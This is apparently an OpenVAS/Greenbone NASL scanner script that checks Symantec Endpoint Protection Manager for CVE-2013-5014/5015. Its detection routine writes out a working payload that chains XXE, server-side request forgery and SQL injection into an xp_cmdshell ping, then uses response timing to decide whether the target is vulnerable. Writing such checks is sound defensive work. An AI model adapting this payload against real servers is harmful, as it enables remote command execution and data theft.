# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804513");
  script_version("2023-07-27T05:05:09+0000");
  script_cve_id("CVE-2013-5014", "CVE-2013-5015");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:09 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-20 11:33:41 +0530 (Thu, 20 Mar 2014)");
  script_name("Symantec Endpoint Protection Manager XXE and SQL Injection Vulnerabilities");

  script_tag(name:"summary", value:"Symantec Endpoint Protection Manager is prone to XXE and SQL injection vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a specially crafted XML data including external entity references to
  TCP port 9090 and check whether it is able to execute commands remotely or not.");
  script_tag(name:"insight", value:"Flaw is due to an error when handling XML data within the servlet/ConsoleServlet.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to disclose potentially sensitive
  information, manipulate certain data, and cause a DoS (Denial of Service).");
  script_tag(name:"affected", value:"Symantec Endpoint Protection Manager (SEPM) 11.0 before 11.0.7405.1424 and
  12.1 before 12.1.4023.4080, and Symantec Protection Center Small Business
  Edition 12.x before 12.1.4023.4080");
  script_tag(name:"solution", value:"Upgrade Symantec Endpoint Protection Manager to version 11.0.7405.1424 or
  12.1.4023.4080 or later, and Symantec Protection Center Small Business Edition
  to version 12.1.4023.4080 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/56798");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65466");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65467");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2014/Feb/82");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31853");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31917");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125282");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125366");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 9090);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

http_port = http_get_port(default:9090);

host = http_host_name(port:http_port);

if(http_vuln_check(port:http_port, url:"/", check_header:TRUE, usecache:TRUE,
   pattern:">Symantec Endpoint Protection Manager<",
               extra_check: "Symantec Corporation<"))
{

  sleep = make_list(3, 5);

  foreach i (sleep)
  {
    url = "/servlet/ConsoleServlet?ActionType=ConsoleLog";

    postdata = string('------=_Part_156_33010715.1234\r\n',
                      'Content-Type: text/xml\r\n',
                      'Content-Disposition: form-data; name="Content"\r\n\r\n',
                      '<?xml version="1.0" encoding="UTF-8"?>\r\n',
                      '<!DOCTYPE sepm [<!ENTITY payload SYSTEM "http://127.0.0.1:', http_port,
                      '/servlet/ConsoleServlet?ActionType=ConfigServer&action=test_av&Sequence',
                      'Num=140320121&Parameter=a\'; call xp_cmdshell(\'ping -n ', i + 1,' 127.0.0.1\');--" >]>\r\n',
                      '<request>\r\n',
                      '<xxe>&payload;</xxe>\r\n',
                      '</request>\r\n',
                      '------=_Part_156_33010715.1234--');

    req = string('POST ', url, ' HTTP/1.1\r\n',
                 'Host: ', host, '\r\n',
                 'Accept-Encoding: identity\r\n',
                 'Content-Length: ', strlen(postdata), '\r\n',
                 'Content-Type: multipart/form-data; boundary="----=_Part_156_33010715.1234"\r\n\r\n',
                  postdata);
    start = unixtime();
    res = http_keepalive_send_recv(port:http_port, data:req);
    stop = unixtime();

    if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable
  }
  security_message(port:http_port);
  exit(0);
}

exit(99);
